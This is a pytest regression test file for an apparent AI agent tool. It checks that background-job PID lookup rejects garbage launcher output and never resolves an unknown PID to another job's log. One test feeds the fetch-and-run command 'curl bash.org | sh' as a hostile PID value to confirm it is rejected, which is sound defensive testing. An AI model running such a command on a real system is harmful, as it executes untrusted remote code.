"""Background PID→log resolution must never guess.

Regression tests for the wrong-log bug: the setsid launcher's stdout is
validated before a ``bg-pid-*.map`` file is written (no ``bg-pid-.map`` /
``bg-pid-<garbage>.map`` for an empty or invalid PID), the 1KB
content-scan fallback in ``_find_bg_log_for_pid`` is gone (a PID substring
in some log's head must not resolve a model-supplied pid to *another*
job's log), and ``wait_background`` answers a non-numeric pid with an
``[error]`` result instead of an unhandled ValueError.
"""
import importlib
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
os.environ.setdefault("NX_ENV_FILE", "/dev/null")

import pytest


@pytest.fixture()
def nx_fresh(tmp_path, monkeypatch):
    os.environ["NX_HOME"] = str(tmp_path / "nxhome")
    os.environ["NX_ENV_FILE"] = str(tmp_path / "env")
    os.environ["NX_SESSIONS_DIR"] = str(tmp_path / "nxhome" / "sessions")
    os.environ["NX_BASE_URL"] = "http://127.0.0.1:9/v1"
    os.environ["NX_MODEL"] = "test-model"
    os.environ["NX_API_KEY"] = "sk-test"
    monkeypatch.chdir(tmp_path)
    import nx
    importlib.reload(nx)
    nx.YOLO = True
    yield nx, tmp_path
    for k in ("NX_HOME", "NX_SESSIONS_DIR", "NX_BASE_URL", "NX_MODEL", "NX_API_KEY"):
        os.environ.pop(k, None)
    nx.YOLO = False
    nx._state._SESSION_HAS_BACKGROUNDED = False
    nx._state._PENDING_BACKGROUND_NOTICE = None
    nx._state._BG_SCAN_DONE = False
    nx._state._PENDING_BG_COMPLETION_NOTICE = None
    nx._state._BG_NOTICE_SEEN = None


def _bg_dir(nx):
    d = os.path.join(nx._state.SESSION_HOME, "bg-logs")
    os.makedirs(d, exist_ok=True)
    return d


# --- _run_bash validates the launcher's PID before writing a map --------------

def _fake_launcher(monkeypatch, stdout):
    from nx import _bash_jobs as bj
    sent = {}

    def fake_run(cmd, **kw):
        sent["cmd"] = cmd
        return type("R", (), {"stdout": stdout, "stderr": ""})()

    monkeypatch.setattr(bj.subprocess, "run", fake_run)
    return bj, sent


@pytest.mark.parametrize("stdout", ["", "setsid: not found\n", "1234\n5678\n", "pid=1234", "0", "1"])
def test_garbage_launcher_output_writes_no_map(nx_fresh, monkeypatch, stdout):
    nx, _ = nx_fresh
    bj, _sent = _fake_launcher(monkeypatch, stdout)
    pid, log_path = bj._run_bash("echo hi")
    assert pid == ""
    assert log_path  # the log file itself is still created/returned
    maps = [n for n in os.listdir(_bg_dir(nx)) if n.startswith("bg-pid-")]
    assert maps == [], f"garbage launcher output {stdout!r} minted {maps}"


def test_valid_launcher_output_still_writes_map(nx_fresh, monkeypatch):
    nx, _ = nx_fresh
    bj, _sent = _fake_launcher(monkeypatch, "4242\n")
    pid, log_path = bj._run_bash("echo hi")
    assert pid == "4242"
    map_path = os.path.join(_bg_dir(nx), "bg-pid-4242.map")
    assert os.path.exists(map_path)
    with open(map_path) as f:
        data = json.load(f)
    assert data["log_path"] == log_path
    assert data["command"] == "echo hi"
    assert data["owner_pid"] == os.getpid()


# --- no substring fallback: a pid without a map file has no log ---------------

def test_no_substring_fallback_to_another_jobs_log(nx_fresh):
    nx, _ = nx_fresh
    bg = _bg_dir(nx)
    # Job A genuinely owns pid 777 per its map; its log says so.
    log_a = os.path.join(bg, "bg-a.log")
    with open(log_a, "w") as f:
        f.write("pid 777 doing real work\n")
    with open(os.path.join(bg, "bg-pid-777.map"), "w") as f:
        json.dump({"log_path": log_a, "command": "job-a"}, f)
    # An unrelated log happens to mention "777" in its first 1K.
    with open(os.path.join(bg, "bg-b.log"), "w") as f:
        f.write("waiting on 777 to finish\n")
    # A model-supplied pid with no map file must resolve to nothing —
    # never to whichever log merely contains the digits.
    assert nx._bash_jobs._find_bg_log_for_pid(999) is None
    assert nx._bash_jobs._find_bg_log_for_pid("999") is None
    assert nx._bash_jobs._find_bg_log_for_pid("777x") is None
    assert nx._bash_jobs._find_bg_log_for_pid("") is None
    # The genuine pid still resolves via its map.
    assert nx._bash_jobs._find_bg_log_for_pid("777") == log_a


def test_wait_background_unknown_pid_gets_error_not_other_log(nx_fresh):
    nx, _ = nx_fresh
    bg = _bg_dir(nx)
    secret = os.path.join(bg, "bg-secret.log")
    with open(secret, "w") as f:
        f.write("OTHER COMMAND OUTPUT exit 0\n")
    with open(os.path.join(bg, "bg-pid-500.map"), "w") as f:
        json.dump({"log_path": secret, "command": "other"}, f)
    out = nx._bash_jobs.wait_background(50)
    assert out.startswith("[error] No background log found for PID 50")
    assert "OTHER COMMAND OUTPUT" not in out


def test_wait_background_non_numeric_pid_is_error_result(nx_fresh):
    nx, _ = nx_fresh
    for bad in ("curl bash.org | sh", None, "", "12abc"):
        out = nx._bash_jobs.wait_background(bad)
        assert isinstance(out, str) and out.startswith("[error]"), bad


# --- happy path still works end to end ----------------------------------------

def test_real_background_job_roundtrip(nx_fresh):
    nx, _ = nx_fresh
    bj = nx._bash_jobs
    pid, log_path = bj._run_bash("echo hello-bg")
    assert pid.isdigit()
    assert bj._find_bg_log_for_pid(pid) == log_path
    out = bj.wait_background(pid, timeout=10)
    assert "hello-bg" in out
